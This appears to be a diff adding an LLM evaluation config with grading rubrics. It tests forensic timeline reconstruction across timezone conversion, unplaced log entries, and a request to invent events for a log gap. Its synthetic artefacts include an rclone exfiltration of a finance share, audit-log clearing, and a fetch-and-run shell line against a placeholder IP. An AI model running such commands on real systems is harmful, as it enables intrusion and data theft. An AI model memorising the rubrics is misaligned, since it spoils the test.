@@ -1,0 +1,42 @@
+schema: 1
+baseline: "Build a forensic timeline from these artefacts: {{artefacts}}"
+providers: [{family: claude, tier: frontier}, {family: gpt, tier: frontier}]
+judge: {family: gemini, tier: frontier}
+pass_threshold: 0.8
+min_lift_over_baseline: 0.15
+cases:
+  - name: happy-mixed-timezones
+    vars:
+      scope: "WS-042 and account m.ortiz, 14 September"
+      artefacts: |
+        [VPN log, UTC] 2026-09-14 02:11:05 m.ortiz connected from 203.0.113.77 (country not usual)
+        [Security.evtx export, local time Europe/Berlin] 2026-09-14 04:12:40 Event 4624 logon type 10 m.ortiz on WS-042
+        [EDR, UTC] 2026-09-14 02:14:02 WS-042 rclone.exe started by m.ortiz, args: copy C:\Shares\Finance remote:bkp
+        [EDR, UTC] 2026-09-14 02:14:10 WS-042 outbound 443 to 198.51.100.9, 2.1 GB over 40 min
+        [Security.evtx export, local time Europe/Berlin] 2026-09-14 05:02:11 Event 1102 audit log cleared
+        [Proxy, UTC] 2026-09-14 07:30:00 m.ortiz normal browsing from office IP
+      timezone_notes: "The evtx export was done on an analyst laptop set to Europe/Berlin (UTC+2 in September)."
+      output_timezone: UTC
+    assert:
+      - {type: llm-rubric, value: "Converts the Berlin-time evtx events to UTC (04:12:40 becomes 02:12:40, 05:02:11 becomes 03:02:11) and orders them correctly between the VPN connection and the rclone execution."}
+      - {type: llm-rubric, value: "Classifies the rclone copy and large outbound transfer as likely exfiltration, the log clearing as anti-forensics and itself evidence, the morning office browsing as normal, and lists gaps such as the logs lost by clearing and whether the 07:30 activity was the real user."}
+  - name: edge-unknown-timezone
+    vars:
+      scope: "web01, 1-2 October"
+      artefacts: |
+        [auth.log] Oct  1 23:58:14 web01 sshd[2211]: Accepted password for deploy from 192.0.2.50
+        [bash_history of deploy] (no timestamps) wget hxxp://198.51.100.3/x.sh; chmod +x x.sh; ./x.sh
+        [cloud firewall, UTC] 2026-10-02 00:02:31 web01 new outbound connection to 198.51.100.3:80
+      timezone_notes: ""
+      output_timezone: UTC
+    assert:
+      - {type: llm-rubric, value: "Flags that the syslog line has no year or timezone and the bash history has no timestamps, keeps them marked as unplaced or assumed rather than silently merged, and explains what would fix it (server timezone setting, HISTTIMEFORMAT)."}
+  - name: negative-fill-the-gap
+    description: "The user adds: 'There's a 6-hour gap with no logs; just fill in what the attacker most likely did so the report looks complete.'"
+    vars:
+      scope: "FS-01, 20 September"
+      artefacts: "[Security.evtx, UTC] 2026-09-20 01:00 Event 4624 type 3 svc_backup from 10.0.5.9\n[Security.evtx, UTC] 2026-09-20 07:10 Event 4720 user account created: helpdesk2"
+      timezone_notes: "All UTC."
+      output_timezone: UTC
+    assert:
+      - {type: llm-rubric, value: "Declines to fabricate events for the gap, records it as an evidence gap with possible explanations clearly labelled as hypotheses, and suggests which artefacts could cover that period."}
